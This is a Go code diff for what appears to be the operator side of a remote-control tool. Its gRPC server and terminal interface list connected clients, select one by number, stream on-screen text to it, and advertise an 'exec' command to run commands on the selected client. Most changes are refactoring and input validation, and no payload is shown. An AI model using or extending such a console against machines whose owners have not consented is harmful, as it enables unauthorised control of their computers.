@@ -6,7 +6,9 @@ import (
 	"log"
 	"net"
 	"os"
+	"strconv"
 	"strings"
+	"time"
 
 	pb "github.com/Xart3mis/GoHkarComms/client_data_pb"
 	tea "github.com/charmbracelet/bubbletea"
@@ -14,7 +16,6 @@ import (
 	"github.com/fatih/color"
 	"github.com/magodo/textinput"
 
-	"golang.org/x/net/context"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 )
@@ -25,6 +26,7 @@ type server struct {
 
 var client_ids []string
 var client_onscreentext map[string]string = make(map[string]string)
+var client_mapids map[int]string = make(map[int]string)
 
 var current_id string = ""
 
@@ -43,7 +45,7 @@ func main() {
 	}
 
 	s := grpc.NewServer(grpc.Creds(creds))
-	lis, err := net.Listen("tcp", "0.0.0.0:8000")
+	lis, err := net.Listen("tcp", ":8000")
 	if err != nil {
 		log.Fatalf("Failed to listen: %v", err)
 	}
@@ -74,36 +76,6 @@ func loadTLSCredentials() (credentials.TransportCredentials, error) {
 	return credentials.NewTLS(config), nil
 }
 
-func (s *server) UnregisterClient(ctx context.Context, in *pb.ClientDataRequest) (*pb.RegisterResponse, error) {
-	// var linearSearch func(s []string, val string) int = func(s []string, val string) int {
-	// 	for i, v := range s {
-	// 		if v == val {
-	// 			return i
-	// 		}
-	// 	}
-
-	// 	return -1
-	// }
-
-	// var rmelem func(s []string, idx int) []string = func(s []string, idx int) []string {
-	// 	if idx == -1 {
-	// 		return []string{}
-	// 	}
-
-	// 	return append(s[:idx], s[idx+1:]...)
-	// }
-
-	// client_ids = rmelem(client_ids, linearSearch(client_ids, in.ClientId))
-	return &pb.RegisterResponse{Status: 0}, nil
-}
-
-func (s *server) RegisterClient(ctx context.Context, in *pb.ClientDataRequest) (*pb.RegisterResponse, error) {
-	if !Contains(client_ids, in.ClientId) {
-		client_ids = append(client_ids, in.ClientId)
-	}
-	return &pb.RegisterResponse{Status: 0}, nil
-}
-
 func Contains(sl []string, name string) bool {
 	for _, value := range sl {
 		if value == name {
@@ -113,25 +85,34 @@ func Contains(sl []string, name string) bool {
 	return false
 }
 
-func (s *server) GetOnScreenText(ctx context.Context, in *pb.ClientDataRequest) (*pb.ClientDataOnScreenTextResponse, error) {
-	if in.ClientId == current_id {
-		return &pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
-			ShouldUpdate: len(client_onscreentext[current_id]) > 0,
-			OnScreenText: client_onscreentext[current_id],
-		},
-		}, nil
+func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_SubscribeOnScreenTextServer) error {
+	if !Contains(client_ids, r.ClientId) {
+		client_ids = append(client_ids, r.ClientId)
 	}
-	return &pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{}}, nil
+	for {
+		if r.GetClientId() == current_id {
+			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
+				ShouldUpdate: len(client_onscreentext[current_id]) > 0,
+				OnScreenText: client_onscreentext[current_id]}})
+		} else {
+			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
+				ShouldUpdate: false,
+				OnScreenText: ""}})
+		}
+		time.Sleep(250 * time.Millisecond)
+	}
 }
 
 type model struct {
-	textInput      textinput.Model
-	typing         bool
-	showhelplist   bool
-	showclientlist bool
-	showok         bool
-	err            error
-	clients        []string
+	textInput        textinput.Model
+	typing           bool
+	showhelplist     bool
+	showclientlist   bool
+	showok           bool
+	shownotvalidcid  bool
+	shownotvalidtext bool
+	err              error
+	clients          []string
 }
 
 func initialModel() model {
@@ -152,13 +133,15 @@ func initialModel() model {
 	ti.CandidateViewMode = textinput.CandidateViewHorizental
 
 	return model{
-		textInput:      ti,
-		err:            nil,
-		typing:         true,
-		showhelplist:   false,
-		showok:         false,
-		showclientlist: false,
-		clients:        client_ids,
+		textInput:        ti,
+		err:              nil,
+		typing:           true,
+		showhelplist:     false,
+		showok:           false,
+		showclientlist:   false,
+		shownotvalidcid:  false,
+		shownotvalidtext: false,
+		clients:          client_ids,
 	}
 }
 
@@ -168,6 +151,11 @@ func (m model) Init() tea.Cmd {
 
 func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 	var cmd tea.Cmd
+
+	for idx, client := range client_ids {
+		client_mapids[idx] = client
+	}
+
 	switch msg := msg.(type) {
 	case tea.KeyMsg:
 		switch msg.String() {
@@ -176,8 +164,10 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			return m, tea.Quit
 
 		case "esc", "q":
-			m.showhelplist = false
+			m.shownotvalidtext = false
+			m.shownotvalidcid = false
 			m.showclientlist = false
+			m.showhelplist = false
 			m.showok = false
 			return m, nil
 
@@ -191,17 +181,35 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			// }
 
 			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
-				m.showok = true
 				split_str := strings.Split(m.textInput.Value(), " ")
 				if len(split_str) > 2 {
 					panic("select only takes 1 argument")
 				}
-				current_id = split_str[1]
+				val, err := strconv.Atoi(split_str[1])
+				if err != nil {
+					m.shownotvalidcid = true
+					return m, nil
+				}
+
+				if Contains(client_ids, client_mapids[val]) {
+					m.showok = true
+					current_id = client_mapids[val]
+					return m, nil
+				}
+
+				m.shownotvalidcid = true
 			}
 
 			if len(m.textInput.Value()) > 7 && m.textInput.Value()[:7] == "settext" {
 				split_str := strings.Split(m.textInput.Value(), " ")
+				if len(split_str) <= 1 {
+					m.shownotvalidtext = true
+					return m, nil
+				} else if len(client_mapids) < 1 {
+					//
+				}
 				client_onscreentext[current_id] = strings.Join(split_str[1:], " ")
+				m.showok = true
 			}
 
 			switch m.textInput.Value() {
@@ -238,13 +246,23 @@ func (m model) View() string {
 			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [`text`]") + ")\n\n" +
 			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [`command string`]") + ")\n\n" +
 			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n"
-	} else if m.showclientlist {
+	}
+	if m.showclientlist {
 		Magenta := color.New(color.FgMagenta).SprintFunc()
-		b, _ := json.MarshalIndent(m.clients, "", "\t")
+		b, _ := json.MarshalIndent(client_mapids, "", "\t")
 		return m.textInput.View() + "\n\n" + Magenta(string(b))
-	} else if m.showok {
+	}
+	if m.shownotvalidcid {
+		red := color.New(color.FgRed).SprintFunc()
+		return m.textInput.View() + "\n\n" + red("Not a valid client ID.")
+	}
+	if m.showok {
 		Green := color.New(color.FgGreen).SprintFunc()
 		return m.textInput.View() + "\n\n" + Green("OK.")
+	}
+	if m.shownotvalidtext {
+		red := color.New(color.FgRed).SprintFunc()
+		return m.textInput.View() + "\n\n" + red("settext takes multiple arguments.")
 	}
 
 	return m.textInput.View()
